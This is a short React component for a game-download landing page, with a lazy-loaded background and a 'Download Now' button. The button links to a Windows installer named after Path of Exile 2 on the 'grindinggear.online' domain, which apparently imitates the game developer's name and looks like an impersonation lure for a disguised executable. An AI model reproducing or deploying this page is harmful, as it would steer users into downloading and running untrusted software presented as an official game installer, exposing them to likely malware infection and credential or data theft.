import React, { useState, useEffect, useRef } from 'react';
import { HeroSection } from '../types';

const heroData: HeroSection = {
  title: '',
  subtitle: 'Experience our games',
  backgroundImage: 'https://ima.grindinggear.online/grindinggear/main-web.webp'
};

export const Hero: React.FC = () => {
  const [isVisible, setIsVisible] = useState(false);
  const bgRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) {
          setIsVisible(true);
          observer.disconnect();
        }
      },
      { rootMargin: '100px' }
    );
    if (bgRef.current) {
      observer.observe(bgRef.current);
    }
    return () => observer.disconnect();
  }, []);

  return (
    <section className="relative h-screen flex items-center justify-center">
      <div
        ref={bgRef}
        className="absolute inset-0 bg-cover bg-center z-0"
        style={
          isVisible
            ? { backgroundImage: `url(${heroData.backgroundImage})` }
            : undefined
        }
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/50 via-transparent to-black/80" />
      </div>

      <div className="relative z-10 text-center text-white">
        <h1 className="text-7xl font-bold tracking-wider mb-4">
          {heroData.title}
        </h1>
        <p className="text-2xl font-light">{heroData.subtitle}</p>
        <a
          href="https://run.grindinggear.online/launcher/PathOfExile2Installer.exe"
          className="mt-8 px-8 py-3 border border-white text-white bg-transparent hover:bg-white hover:text-black transition-colors rounded-lg inline-block"
        >
          Download Now
        </a>
      </div>
    </section>
  );
};